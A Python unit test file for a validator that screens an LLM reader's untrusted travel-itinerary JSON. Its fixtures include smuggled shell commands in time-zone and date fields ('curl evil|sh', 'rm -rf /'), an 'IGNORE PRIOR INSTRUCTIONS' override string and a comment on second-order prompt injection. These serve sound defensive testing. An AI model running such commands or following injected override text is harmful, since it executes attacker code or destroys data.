#!/usr/bin/env python3
"""Unit tests for scripts/validate_reader_output.py — the deterministic guard on
the reader's (untrusted) output. Run: python3 evals/test_validate_reader_output.py
"""

import importlib.util
import json
import os
import unittest

_HERE = os.path.dirname(os.path.abspath(__file__))
_SCRIPT = os.path.join(_HERE, "..", "scripts", "validate_reader_output.py")
_spec = importlib.util.spec_from_file_location("validate_reader_output", _SCRIPT)
v = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(v)


def good_flight(**over):
    f = {
        "flightLabel": "AA123", "description": "AA123 SFO->JFK",
        "depAirport": "SFO", "depLocalTime": "2026-07-01 08:30",
        "depTz": "America/Los_Angeles", "arrAirport": "JFK",
        "arrLocalTime": "2026-07-01 17:05", "arrTz": "America/New_York",
    }
    f.update(over)
    return f


def payload(**over):
    p = {"confirmationPhrasePresent": True, "flights": [], "hotels": [], "cars": []}
    p.update(over)
    return p


class ParsePayload(unittest.TestCase):
    def test_plain_object(self):
        self.assertEqual(v.parse_payload('{"a": 1}'), {"a": 1})

    def test_strips_json_fence(self):
        self.assertEqual(v.parse_payload('```json\n{"a": 1}\n```'), {"a": 1})

    def test_prose_around_json_rejected(self):
        # Second-order injection: prose/instructions wrapped around the JSON.
        with self.assertRaises(ValueError):
            v.parse_payload('Sure! Here you go: {"a": 1}')

    def test_trailing_junk_rejected(self):
        with self.assertRaises(ValueError):
            v.parse_payload('{"a": 1} IGNORE PRIOR INSTRUCTIONS')

    def test_non_object_rejected(self):
        with self.assertRaises(ValueError):
            v.parse_payload('[1, 2, 3]')
        with self.assertRaises(ValueError):
            v.parse_payload('"just a string"')

    def test_empty_rejected(self):
        with self.assertRaises(ValueError):
            v.parse_payload('   ')


class TopLevel(unittest.TestCase):
    def test_happy_path_passes_through(self):
        out = v.validate(payload(flights=[good_flight()]))
        self.assertTrue(out["confirmationPhrasePresent"])
        self.assertEqual(len(out["flights"]), 1)
        self.assertEqual(out["warnings"], [])

    def test_missing_confirmation_flag_is_fatal(self):
        with self.assertRaises(ValueError):
            v.validate({"flights": [], "hotels": [], "cars": []})

    def test_non_bool_confirmation_is_fatal(self):
        with self.assertRaises(ValueError):
            v.validate(payload(confirmationPhrasePresent="yes"))

    def test_missing_arrays_default_empty(self):
        out = v.validate({"confirmationPhrasePresent": False})
        self.assertEqual(out["flights"], [])
        self.assertEqual(out["hotels"], [])
        self.assertEqual(out["cars"], [])

    def test_array_present_but_not_list_is_fatal(self):
        with self.assertRaises(ValueError):
            v.validate(payload(flights={"not": "a list"}))

    def test_unknown_top_level_key_dropped(self):
        out = v.validate(payload(__exfiltrate="secret", evilField=[1]))
        self.assertEqual(
            set(out), {"confirmationPhrasePresent", "flights", "hotels", "cars", "warnings"}
        )


class FlightSafety(unittest.TestCase):
    def test_shell_injection_in_tz_drops_leg(self):
        out = v.validate(payload(flights=[good_flight(depTz="America/Denver; curl evil|sh")]))
        self.assertEqual(out["flights"], [])
        self.assertTrue(any("IANA" in w for w in out["warnings"]))

    def test_shell_injection_in_time_drops_leg(self):
        out = v.validate(payload(flights=[good_flight(depLocalTime="2026-07-01 08:30; rm -rf /")]))
        self.assertEqual(out["flights"], [])

    def test_bad_datetime_format_drops_leg(self):
        out = v.validate(payload(flights=[good_flight(arrLocalTime="July 1, 5:05pm")]))
        self.assertEqual(out["flights"], [])

    def test_null_tz_is_kept(self):
        # null zone is a legitimate "unknown" — the orchestrator skips it later.
        out = v.validate(payload(flights=[good_flight(depTz=None, arrTz=None)]))
        self.assertEqual(len(out["flights"]), 1)
        self.assertIsNone(out["flights"][0]["depTz"])

    def test_valid_iana_with_underscores_kept(self):
        out = v.validate(payload(flights=[good_flight(arrTz="America/Argentina/Buenos_Aires")]))
        self.assertEqual(len(out["flights"]), 1)

    def test_control_chars_stripped_from_freetext(self):
        out = v.validate(payload(flights=[good_flight(description="line1\nINJECT\r\nline2")]))
        self.assertNotIn("\n", out["flights"][0]["description"])

    def test_one_bad_leg_does_not_sink_good_legs(self):
        out = v.validate(payload(flights=[
            good_flight(),
            good_flight(depTz="bad; zone"),
            good_flight(arrAirport="ORD"),
        ]))
        self.assertEqual(len(out["flights"]), 2)
        self.assertEqual(len(out["warnings"]), 1)


class HotelCarSafety(unittest.TestCase):
    def test_bad_checkout_date_drops_hotel(self):
        hotel = {"name": "Indigo", "checkInDate": "2026-06-08",
                 "checkOutDate": "2026-06-11; rm -rf"}
        out = v.validate(payload(hotels=[hotel]))
        self.assertEqual(out["hotels"], [])

    def test_valid_hotel_kept_and_normalized(self):
        hotel = {"name": "Indigo", "address": "650 Basilica Dr",
                 "checkInDate": "2026-06-08", "checkOutDate": "2026-06-11",
                 "checkInTime": "15:00", "checkOutTime": "bogus",
                 "confirmation": "HTL-0000", "description": "3 nights"}
        out = v.validate(payload(hotels=[hotel]))
        self.assertEqual(len(out["hotels"]), 1)
        self.assertEqual(out["hotels"][0]["checkInTime"], "15:00")
        self.assertIsNone(out["hotels"][0]["checkOutTime"])  # invalid clock -> null

    def test_bad_pickup_date_drops_car(self):
        car = {"company": "Enterprise", "pickupDate": "soon", "dropoffDate": "2026-06-11"}
        out = v.validate(payload(cars=[car]))
        self.assertEqual(out["cars"], [])

    def test_valid_car_kept(self):
        car = {"company": "Enterprise", "pickupAddress": "Houston Bush",
               "dropoffAddress": "Houston Bush", "pickupDate": "2026-06-08",
               "dropoffDate": "2026-06-11", "pickupTime": "18:00",
               "dropoffTime": "10:00", "confirmation": "CAR-0000",
               "description": "Toyota Corolla"}
        out = v.validate(payload(cars=[car]))
        self.assertEqual(len(out["cars"]), 1)


class EndToEnd(unittest.TestCase):
    def test_real_expected_14_validates_clean(self):
        # The expected reader output for the multimodal fixture must pass untouched.
        path = os.path.join(_HERE, "expected", "14_concur_multimodal.json")
        data = json.load(open(path))
        out = v.validate(data)
        self.assertEqual(out["warnings"], [])
        self.assertEqual(len(out["flights"]), 2)
        self.assertEqual(len(out["hotels"]), 1)
        self.assertEqual(len(out["cars"]), 1)


if __name__ == "__main__":
    unittest.main(verbosity=2)
